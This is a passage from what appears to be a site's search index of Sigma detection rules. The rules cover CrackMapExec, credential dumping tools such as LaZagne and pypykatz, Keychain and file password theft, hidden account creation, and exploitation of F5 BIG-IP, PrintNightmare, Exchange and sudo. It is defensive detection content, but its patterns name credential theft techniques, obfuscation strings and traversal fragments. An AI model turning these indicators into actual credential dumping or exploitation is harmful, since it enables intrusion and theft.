\u0026#39; condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_crackmapexec_execution.yml/","tags":["attack.execution","attack.t1047","attack.t1053","attack.t1059.003","attack.t1059.001","attack.s0106"],"title":"CrackMapExec Command Execution"},{"categories":null,"contents":"The CrachMapExec pentesting framework implements a PowerShell obfuscation with some static strings detected by this rule.\nKnown false-positives Unknown References https://github.com/byt3bl33d3r/CrackMapExec https://github.com/byt3bl33d3r/CrackMapExec/blob/0a49f75347b625e81ee6aa8c33d3970b5515ea9e/cme/helpers/powershell.py#L242 Raw rule (edit) title: CrackMapExec PowerShell Obfuscation id: 6f8b3439-a203-45dc-a88b-abf57ea15ccf status: test description: The CrachMapExec pentesting framework implements a PowerShell obfuscation with some static strings detected by this rule. author: Thomas Patzke references: - https://github.com/byt3bl33d3r/CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec/blob/0a49f75347b625e81ee6aa8c33d3970b5515ea9e/cme/helpers/powershell.py#L242 date: 2020/05/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: powershell_execution: CommandLine|contains: \u0026#39;powershell.exe\u0026#39; snippets: CommandLine|contains: - \u0026#39;join*split\u0026#39; # Line 343ff - \u0026#39;( $ShellId[1]+$ShellId[13]+\u0026#39;\u0026#39;x\u0026#39;\u0026#39;)\u0026#39; - \u0026#39;( $PSHome[*]+$PSHOME[*]+\u0026#39; - \u0026#39;( $env:Public[13]+$env:Public[5]+\u0026#39;\u0026#39;x\u0026#39;\u0026#39;)\u0026#39; - \u0026#39;( $env:ComSpec[4,*,25]-Join\u0026#39;\u0026#39;\u0026#39;\u0026#39;)\u0026#39; - \u0026#39;[1,3]+\u0026#39;\u0026#39;x\u0026#39;\u0026#39;-Join\u0026#39;\u0026#39;\u0026#39;\u0026#39;)\u0026#39; condition: powershell_execution and snippets fields: - ComputerName - User - CommandLine falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1027.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_crackmapexec_powershell_obfuscation.yml/","tags":["attack.execution","attack.t1059.001","attack.defense_evasion","attack.t1027.005"],"title":"CrackMapExec PowerShell Obfuscation"},{"categories":null,"contents":"Detects CrackMapExecWin Activity as Described by NCSC\nKnown false-positives None References https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control https://attack.mitre.org/software/S0488/ Raw rule (edit) title: CrackMapExecWin id: 04d9079e-3905-4b70-ad37-6bdf11304965 status: test description: Detects CrackMapExecWin Activity as Described by NCSC author: Markus Neis references: - https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control - https://attack.mitre.org/software/S0488/ date: 2018/04/08 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\crackmapexec.exe\u0026#39; condition: selection falsepositives: - None level: critical tags: - attack.g0035 - attack.credential_access - attack.discovery - attack.t1110 - attack.t1087 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_dragonfly.yml/","tags":["attack.g0035","attack.credential_access","attack.discovery","attack.t1110","attack.t1087"],"title":"CrackMapExecWin"},{"categories":null,"contents":"Detects uses of the createdump.exe LOLOBIN utility to dump process memory\nKnown false-positives Command lines that use the same flags References https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/ Raw rule (edit) title: CreateDump Process Dump id: 515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48 description: Detects uses of the createdump.exe LOLOBIN utility to dump process memory status: experimental references: - https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/ author: Florian Roth date: 2022/01/04 tags: - attack.defense_evasion - attack.t1036 - attack.t1003.001 logsource: category: process_creation product: windows detection: selection1: Image|endswith: \u0026#39;\\createdump.exe\u0026#39; CommandLine|contains|all: - \u0026#39; -u \u0026#39; - \u0026#39; -f \u0026#39; selection2: CommandLine|contains|all: - \u0026#39; -u -f \u0026#39; - \u0026#39;.dmp \u0026#39; condition: selection1 or selection2 falsepositives: - Command lines that use the same flags level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_proc_dump_createdump.yml/","tags":["attack.defense_evasion","attack.t1036","attack.t1003.001"],"title":"CreateDump Process Dump"},{"categories":null,"contents":"Sysmon registry detection of a local hidden user account.\nKnown false-positives unknown References https://twitter.com/SBousseaden/status/1387530414185664538 Raw rule (edit) title: Creation of a Local Hidden User Account by Registry id: 460479f3-80b7-42da-9c43-2cc1d54dbccd description: Sysmon registry detection of a local hidden user account. status: experimental date: 2021/05/03 modified: 2021/05/12 author: Christian Burkard tags: - attack.persistence - attack.t1136.001 references: - https://twitter.com/SBousseaden/status/1387530414185664538 logsource: product: windows category: registry_event detection: selection: TargetObject|startswith: \u0026#39;HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Names\\\u0026#39; TargetObject|endswith: \u0026#39;$\u0026#39; Image|endswith: \u0026#39;lsass.exe\u0026#39; condition: selection falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_add_local_hidden_user.yml/","tags":["attack.persistence","attack.t1136.001"],"title":"Creation of a Local Hidden User Account by Registry"},{"categories":null,"contents":"Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.001/T1136.001.md Raw rule (edit) title: Creation Of A Local User Account id: 51719bf5-e4fd-4e44-8ba8-b830e7ac0731 status: test description: Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system. author: Alejandro Ortuno, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.001/T1136.001.md date: 2020/10/06 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection: Image|endswith: - \u0026#39;/dscl\u0026#39; CommandLine|contains: - \u0026#39;create\u0026#39; condition: selection falsepositives: - Legitimate administration activities level: low tags: - attack.t1136.001 - attack.persistence ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_create_account.yml/","tags":["attack.t1136.001","attack.persistence"],"title":"Creation Of A Local User Account"},{"categories":null,"contents":"Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.\nKnown false-positives Admin activity References MITRE Attack technique T1136; Create Account Raw rule (edit) title: Creation Of An User Account id: 759d0d51-bc99-4b5e-9add-8f5b2c8e7512 status: test description: Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system. author: Marie Euler references: - \u0026#39;MITRE Attack technique T1136; Create Account \u0026#39; date: 2020/05/18 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: \u0026#39;SYSCALL\u0026#39; exe|endswith: \u0026#39;/useradd\u0026#39; condition: selection falsepositives: - Admin activity level: medium tags: - attack.t1136.001 - attack.persistence ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_create_account.yml/","tags":["attack.t1136.001","attack.persistence"],"title":"Creation Of An User Account"},{"categories":null,"contents":"Detects well-known credential dumping tools execution via specific named pipes\nKnown false-positives Legitimate Administrator using tool for password recovery References https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment Raw rule (edit) title: Cred Dump-Tools Named Pipes id: 961d0ba2-3eea-4303-a930-2cf78bbfcc5e status: test description: Detects well-known credential dumping tools execution via specific named pipes author: Teymur Kheirkhabarov, oscd.community references: - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment date: 2019/11/01 modified: 2021/11/27 logsource: product: windows category: pipe_created definition: \u0026#39;Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\u0026#39; detection: selection: PipeName|contains: - \u0026#39;\\lsadump\u0026#39; - \u0026#39;\\cachedump\u0026#39; - \u0026#39;\\wceservicepipe\u0026#39; condition: selection falsepositives: - Legitimate Administrator using tool for password recovery level: critical tags: - attack.credential_access - attack.t1003.001 - attack.t1003.002 - attack.t1003.004 - attack.t1003.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/pipe_created/pipe_created_cred_dump_tools_named_pipes.yml/","tags":["attack.credential_access","attack.t1003.001","attack.t1003.002","attack.t1003.004","attack.t1003.005"],"title":"Cred Dump-Tools Named Pipes"},{"categories":null,"contents":"Detects LSASS process access by LaZagne for credential dumping.\nKnown false-positives Unknown References https://twitter.com/bh4b3sh/status/1303674603819081728 Raw rule (edit) title: Credential Dumping by LaZagne id: 4b9a8556-99c4-470b-a40c-9c8d02c77ed0 description: Detects LSASS process access by LaZagne for credential dumping. status: stable date: 2020/09/09 author: Bhabesh Raj, Jonhnathan Ribeiro references: - https://twitter.com/bh4b3sh/status/1303674603819081728 tags: - attack.credential_access - attack.t1003.001 - attack.s0349 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: \u0026#39;\\lsass.exe\u0026#39; CallTrace|contains|all: - \u0026#39;C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+\u0026#39; - \u0026#39;|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+\u0026#39; - \u0026#39;_ctypes.pyd+\u0026#39; - \u0026#39;python27.dll+\u0026#39; GrantedAccess: \u0026#39;0x1FFFFF\u0026#39; condition: selection level: critical falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_lazagne_cred_dump_lsass_access.yml/","tags":["attack.credential_access","attack.t1003.001","attack.s0349"],"title":"Credential Dumping by LaZagne"},{"categories":null,"contents":"Detects LSASS process access by pypykatz for credential dumping.\nKnown false-positives Unknown References https://github.com/skelsec/pypykatz Raw rule (edit) title: Credential Dumping by Pypykatz id: 7186e989-4ed7-4f4e-a656-4674b9e3e48b description: Detects LSASS process access by pypykatz for credential dumping. status: experimental date: 2021/08/03 author: Bhabesh Raj references: - https://github.com/skelsec/pypykatz tags: - attack.credential_access - attack.t1003.001 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: \u0026#39;\\lsass.exe\u0026#39; CallTrace|contains|all: - \u0026#39;C:\\Windows\\SYSTEM32\\ntdll.dll+\u0026#39; - \u0026#39;C:\\Windows\\System32\\KERNELBASE.dll+\u0026#39; - \u0026#39;libffi-7.dll\u0026#39; - \u0026#39;_ctypes.pyd+\u0026#39; - \u0026#39;python3*.dll+\u0026#39; # Pypy requires python\u0026gt;=3.6 GrantedAccess: \u0026#39;0x1FFFFF\u0026#39; condition: selection level: critical falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_pypykatz_cred_dump_lsass_access.yml/","tags":["attack.credential_access","attack.t1003.001"],"title":"Credential Dumping by Pypykatz"},{"categories":null,"contents":"Detects well-known credential dumping tools execution via service execution events\nKnown false-positives Legitimate Administrator using credential dumping tool for password recovery References https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment Raw rule (edit) title: Credential Dumping Tools Service Execution id: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed description: Detects well-known credential dumping tools execution via service execution events status: experimental author: Florian Roth, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community date: 2017/03/05 modified: 2021/11/30 references: - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment tags: - attack.credential_access - attack.execution - attack.t1003.001 - attack.t1003.002 - attack.t1003.004 - attack.t1003.005 - attack.t1003.006 - attack.t1569.002 - attack.s0005 logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ImagePath|contains: - \u0026#39;fgexec\u0026#39; - \u0026#39;dumpsvc\u0026#39; - \u0026#39;cachedump\u0026#39; - \u0026#39;mimidrv\u0026#39; - \u0026#39;gsecdump\u0026#39; - \u0026#39;servpw\u0026#39; - \u0026#39;pwdump\u0026#39; condition: selection falsepositives: - Legitimate Administrator using credential dumping tool for password recovery level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_mal_creddumper.yml/","tags":["attack.credential_access","attack.execution","attack.t1003.001","attack.t1003.002","attack.t1003.004","attack.t1003.005","attack.t1003.006","attack.t1569.002","attack.s0005"],"title":"Credential Dumping Tools Service Execution"},{"categories":null,"contents":"Detects passwords dumps from Keychain\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.001/T1555.001.md https://gist.github.com/Capybara/6228955 Raw rule (edit) title: Credentials from Password Stores - Keychain id: b120b587-a4c2-4b94-875d-99c9807d6955 status: test description: Detects passwords dumps from Keychain author: Tim Ismilyaev, oscd.community, Florian Roth references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.001/T1555.001.md - https://gist.github.com/Capybara/6228955 date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection1: Image: \u0026#39;/usr/bin/security\u0026#39; CommandLine|contains: - \u0026#39;find-certificate\u0026#39; - \u0026#39; export \u0026#39; selection2: CommandLine|contains: - \u0026#39; dump-keychain \u0026#39; - \u0026#39; login-keychain \u0026#39; condition: 1 of selection* falsepositives: - Legitimate administration activities level: medium tags: - attack.credential_access - attack.t1555.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_creds_from_keychain.yml/","tags":["attack.credential_access","attack.t1555.001"],"title":"Credentials from Password Stores - Keychain"},{"categories":null,"contents":"Detecting attempts to extract passwords with grep\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md Raw rule (edit) title: \u0026#39;Credentials In Files\u0026#39; id: df3fcaea-2715-4214-99c5-0056ea59eb35 status: test description: \u0026#39;Detecting attempts to extract passwords with grep\u0026#39; author: \u0026#39;Igor Fits, oscd.community\u0026#39; references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md date: 2020/10/15 modified: 2021/11/27 logsource: product: linux service: auditd detection: execve: type: \u0026#39;EXECVE\u0026#39; passwordgrep: - \u0026#39;grep\u0026#39; - \u0026#39;password\u0026#39; condition: execve and all of passwordgrep falsepositives: - \u0026#39;Unknown\u0026#39; level: high tags: - attack.credential_access - attack.t1552.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_find_cred_in_files.yml/","tags":["attack.credential_access","attack.t1552.001"],"title":"Credentials In Files"},{"categories":null,"contents":"Detecting attempts to extract passwords with grep and laZagne\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md Raw rule (edit) title: \u0026#39;Credentials In Files\u0026#39; id: 53b1b378-9b06-4992-b972-dde6e423d2b4 status: test description: \u0026#39;Detecting attempts to extract passwords with grep and laZagne\u0026#39; author: \u0026#39;Igor Fits, Mikhail Larin, oscd.community\u0026#39; references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md date: 2020/10/19 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection1: Image|endswith: - \u0026#39;/grep\u0026#39; CommandLine|contains: - \u0026#39;password\u0026#39; selection2: CommandLine|contains: \u0026#39;laZagne\u0026#39; condition: selection1 or selection2 falsepositives: - \u0026#39;Unknown\u0026#39; level: high tags: - attack.credential_access - attack.t1552.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_find_cred_in_files.yml/","tags":["attack.credential_access","attack.t1552.001"],"title":"Credentials In Files"},{"categories":null,"contents":"Adversaries may abuse Visual Basic (VB) for execution\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.005/T1059.005.md Raw rule (edit) title: Cscript Visual Basic Script Execution id: 23250293-eed5-4c39-b57a-841c8933a57d status: experimental description: Adversaries may abuse Visual Basic (VB) for execution author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.005/T1059.005.md date: 2022/01/02 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\cscript.exe CommandLine|contains: \u0026#39;.vbs\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1059.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_cscript_vbs.yml/","tags":["attack.execution","attack.t1059.005"],"title":"Cscript Visual Basic Script Execution"},{"categories":null,"contents":"Detects the execution of Xwizard tool with specific arguments which utilized to run custom class properties.\nKnown false-positives Unknown References https://lolbas-project.github.io/lolbas/Binaries/Xwizard/ Raw rule (edit) title: Custom Class Execution via Xwizard id: 53d4bb30-3f36-4e8a-b078-69d36c4a79ff status: test description: Detects the execution of Xwizard tool with specific arguments which utilized to run custom class properties. author: \u0026#39;Ensar Şamil, @sblmsrsn, @oscd_initiative\u0026#39; references: - https://lolbas-project.github.io/lolbas/Binaries/Xwizard/ date: 2020/10/07 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\xwizard.exe\u0026#39; CommandLine|re: \u0026#39;{[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}}\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_class_exec_xwizard.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Custom Class Execution via Xwizard"},{"categories":null,"contents":"Detects the exploitation attempt of the vulnerability found in F5 BIG-IP and described in CVE-2020-5902\nKnown false-positives Unknown References https://support.f5.com/csp/article/K52145254 https://www.ptsecurity.com/ww-en/about/news/f5-fixes-critical-vulnerability-discovered-by-positive-technologies-in-big-ip-application-delivery-controller/ https://twitter.com/yorickkoster/status/1279709009151434754 https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/ Raw rule (edit) title: CVE-2020-5902 F5 BIG-IP Exploitation Attempt id: 44b53b1c-e60f-4a7b-948e-3435a7918478 status: test description: Detects the exploitation attempt of the vulnerability found in F5 BIG-IP and described in CVE-2020-5902 author: Florian Roth references: - https://support.f5.com/csp/article/K52145254 - https://www.ptsecurity.com/ww-en/about/news/f5-fixes-critical-vulnerability-discovered-by-positive-technologies-in-big-ip-application-delivery-controller/ - https://twitter.com/yorickkoster/status/1279709009151434754 - https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/ date: 2020/07/05 modified: 2021/11/27 logsource: category: webserver detection: selection_base: c-uri|contains: - \u0026#39;/tmui/\u0026#39; - \u0026#39;/hsqldb\u0026#39; selection_traversal: c-uri|contains: - \u0026#39;..;/\u0026#39; - \u0026#39;.jsp/..\u0026#39; condition: selection_base and selection_traversal fields: - c-ip - c-dns falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2020_5902_f5_bigip.yml/","tags":["attack.initial_access","attack.t1190"],"title":"CVE-2020-5902 F5 BIG-IP Exploitation Attempt"},{"categories":null,"contents":"Detects driver load events print service operational log that are a sign of successful exploitation attempts against print spooler vulnerability CVE-2021-1675\nKnown false-positives Unknown References https://twitter.com/MalwareJake/status/1410421967463731200 Raw rule (edit) title: CVE-2021-1675 Print Spooler Exploitation id: f34d942d-c8c4-4f1f-b196-22471aecf10a description: Detects driver load events print service operational log that are a sign of successful exploitation attempts against print spooler vulnerability CVE-2021-1675 author: Florian Roth status: experimental level: critical references: - https://twitter.com/MalwareJake/status/1410421967463731200 date: 2021/07/01 tags: - attack.execution - attack.t1569 - cve.2021.1675 logsource: product: windows service: printservice-operational detection: selection: EventID: \u0026#39;316\u0026#39; keywords: - \u0026#39;UNIDRV.DLL, kernelbase.dll, \u0026#39; - \u0026#39; 123 \u0026#39; - \u0026#39; 1234 \u0026#39; - \u0026#39;mimispool\u0026#39; condition: selection and keywords fields: - DriverAdded falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/printservice/win_exploit_cve_2021_1675_printspooler_operational.yml/","tags":["attack.execution","attack.t1569","cve.2021.1675"],"title":"CVE-2021-1675 Print Spooler Exploitation"},{"categories":null,"contents":"Detects the default filename used in PoC code against print spooler vulnerability CVE-2021-1675\nKnown false-positives Unknown References https://github.com/hhlxf/PrintNightmare https://github.com/afwu/PrintNightmare https://github.com/cube0x0/CVE-2021-1675 Raw rule (edit) title: CVE-2021-1675 Print Spooler Exploitation Filename Pattern id: 2131cfb3-8c12-45e8-8fa0-31f5924e9f07 description: Detects the default filename used in PoC code against print spooler vulnerability CVE-2021-1675 author: Florian Roth status: experimental level: critical references: - https://github.com/hhlxf/PrintNightmare - https://github.com/afwu/PrintNightmare - https://github.com/cube0x0/CVE-2021-1675 date: 2021/06/29 modified: 2021/12/01 tags: - attack.execution - attack.privilege_escalation - attack.resource_development - attack.t1587 - cve.2021.1675 logsource: category: file_event product: windows detection: selection: TargetFilename|contains: - \u0026#39;C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\1\\123\u0026#39; condition: selection fields: - ComputerName - TargetFilename falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_cve_2021_1675_printspooler.yml/","tags":["attack.execution","attack.privilege_escalation","attack.resource_development","attack.t1587","cve.2021.1675"],"title":"CVE-2021-1675 Print Spooler Exploitation Filename Pattern"},{"categories":null,"contents":"Detects remote printer driver load from Detailed File Share in Security logs that are a sign of successful exploitation attempts against print spooler vulnerability CVE-2021-1675 and CVE-2021-34527\nKnown false-positives nothing observed so far References https://twitter.com/INIT_3/status/1410662463641731075 Raw rule (edit) title: CVE-2021-1675 Print Spooler Exploitation IPC Access id: 8fe1c584-ee61-444b-be21-e9054b229694 description: Detects remote printer driver load from Detailed File Share in Security logs that are a sign of successful exploitation attempts against print spooler vulnerability CVE-2021-1675 and CVE-2021-34527 author: INIT_6 status: experimental level: critical references: - https://twitter.com/INIT_3/status/1410662463641731075 date: 2021/07/02 tags: - attack.execution - attack.t1569 - cve.2021.1675 - cve.2021.34527 logsource: product: windows service: security detection: selection: EventID: \u0026#39;5145\u0026#39; ShareName: \u0026#39;\\\\\\*\\IPC$\u0026#39; RelativeTargetName: \u0026#39;spoolss\u0026#39; AccessMask: \u0026#39;0x3\u0026#39; ObjectType: \u0026#39;File\u0026#39; condition: selection falsepositives: - nothing observed so far ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_exploit_cve_2021_1675_printspooler_security.yml/","tags":["attack.execution","attack.t1569","cve.2021.1675","cve.2021.34527"],"title":"CVE-2021-1675 Print Spooler Exploitation IPC Access"},{"categories":null,"contents":"Detects possible successful exploitation for vulnerability described in CVE-2021-26857 by looking for | abnormal subprocesses spawning by Exchange Server’s Unified Messaging service\nKnown false-positives Unknown References https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ Raw rule (edit) title: CVE-2021-26857 Exchange Exploitation id: cd479ccc-d8f0-4c66-ba7d-e06286f3f887 description: Detects possible successful exploitation for vulnerability described in CVE-2021-26857 by looking for | abnormal subprocesses spawning by Exchange Server’s Unified Messaging service author: Bhabesh Raj status: stable level: critical references: - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ date: 2021/03/03 tags: - attack.t1203 - attack.execution - cve.2021.26857 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;UMWorkerProcess.exe\u0026#39; filter: Image|endswith: - \u0026#39;wermgr.exe\u0026#39; - \u0026#39;WerFault.exe\u0026#39; condition: selection and not filter falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_cve_2021_26857_msexchange.yml/","tags":["attack.t1203","attack.execution","cve.2021.26857"],"title":"CVE-2021-26857 Exchange Exploitation"},{"categories":null,"contents":"Detects possible successful exploitation for vulnerability described in CVE-2021-26858 by looking for | creation of non-standard files on disk by Exchange Server’s Unified Messaging service | which could indicate dropping web shells or other malicious content\nKnown false-positives Unknown References https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ Raw rule (edit) title: CVE-2021-26858 Exchange Exploitation id: b06335b3-55ac-4b41-937e-16b7f5d57dfd description: Detects possible successful exploitation for vulnerability described in CVE-2021-26858 by looking for | creation of non-standard files on disk by Exchange Server’s Unified Messaging service | which could indicate dropping web shells or other malicious content author: Bhabesh Raj status: experimental references: - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ date: 2021/03/03 tags: - attack.t1203 - attack.execution - cve.2021.26858 logsource: category: file_event product: windows detection: selection: Image|endswith: \u0026#39;UMWorkerProcess.exe\u0026#39; filter: TargetFilename|endswith: - \u0026#39;CacheCleanup.bin\u0026#39; - \u0026#39;.txt\u0026#39; - \u0026#39;.LOG\u0026#39; - \u0026#39;.cfg\u0026#39; - \u0026#39;cleanup.bin\u0026#39; condition: selection and not filter fields: - ComputerName - TargetFilename falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_cve_2021_26858_msexchange.yml/","tags":["attack.t1203","attack.execution","cve.2021.26858"],"title":"CVE-2021-26858 Exchange Exploitation"},{"categories":null,"contents":"Detects exploitation attempt of vulnerability described in CVE-2021-3156. | Alternative approach might be to look for flooding of auditd logs due to bruteforcing | required to trigger the heap-based buffer overflow.\nKnown false-positives Unknown References https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit Raw rule (edit) title: CVE-2021-3156 Exploitation Attempt id: 5ee37487-4eb8-4ac2-9be1-d7d14cdc559f status: experimental description: Detects exploitation attempt of vulnerability described in CVE-2021-3156. | Alternative approach might be to look for flooding of auditd logs due to bruteforcing | required to trigger the heap-based buffer overflow. author: Bhabesh Raj date: 2021/02/01 modified: 2021/09/14 references: - https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit tags: - attack.privilege_escalation - attack.t1068 - cve.2021.3156 logsource: product: linux service: auditd detection: selection: type: \u0026#39;EXECVE\u0026#39; a0: \u0026#39;/usr/bin/sudoedit\u0026#39; cmd1: a1: \u0026#39;-s\u0026#39; cmd2: a2: \u0026#39;-s\u0026#39; cmd3: a3: \u0026#39;-s\u0026#39; cmd4: a4: \u0026#39;-s\u0026#39; cmd5: a1: \u0026#39;\\\u0026#39; cmd6: a2: \u0026#39;\\\u0026#39; cmd7: a3: \u0026#39;\\\u0026#39; cmd8: a4: \u0026#39;\\\u0026#39; condition: selection and (cmd1 or cmd2 or cmd3 or cmd4) and (cmd5 or cmd6 or cmd7 or cmd8) | count() by host \u0026gt; 50 falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_cve_2021_3156_sudo_buffer_overflow.yml/","tags":["attack.privilege_escalation","attack.t1068","cve.2021.3156"],"title":"CVE-2021-3156 Exploitation Attempt"},{"categories":null,"contents":"Detects a suspicious process pattern found in CVE-2021-40444 exploitation\nKnown false-positives Unknown References https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444 https://twitter.com/neonprimetime/status/1435584010202255375 https://www.joesandbox.com/analysis/476188/1/iochtml Raw rule (edit) title: CVE-2021-40444 Process Pattern id: 894397c6-da03-425c-a589-3d09e7d1f750 description: Detects a suspicious process pattern found in CVE-2021-40444 exploitation status: test references: - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444 - https://twitter.com/neonprimetime/status/1435584010202255375 - https://www.joesandbox.com/analysis/476188/1/iochtml author: \u0026#39;@neonprimetime, Florian Roth\u0026#39; date: 2021/09/08 modified: 2022/03/03 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\control.exe\u0026#39; ParentImage|endswith: - \u0026#39;\\winword.exe\u0026#39; - \u0026#39;\\powerpnt.exe\u0026#39; - \u0026#39;\\excel.exe\u0026#39; filter: CommandLine|endswith: - \u0026#39;\\control.exe input.dll\u0026#39; - \u0026#39;\\control.exe\u0026#34; input.dll\u0026#39; condition: selection and not filter falsepositives: - Unknown level: critical tags: - attack.execution - attack.t1059 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_control_cve_2021_40444.yml/","tags":["attack.execution","attack.t1059"],"title":"CVE-2021-40444 Process Pattern"},{"categories":null,"contents":"Detects exploitation of flaw in path normalization in Apache HTTP server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by \u0026ldquo;require all denied\u0026rdquo; these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.\nKnown false-positives Unknown References 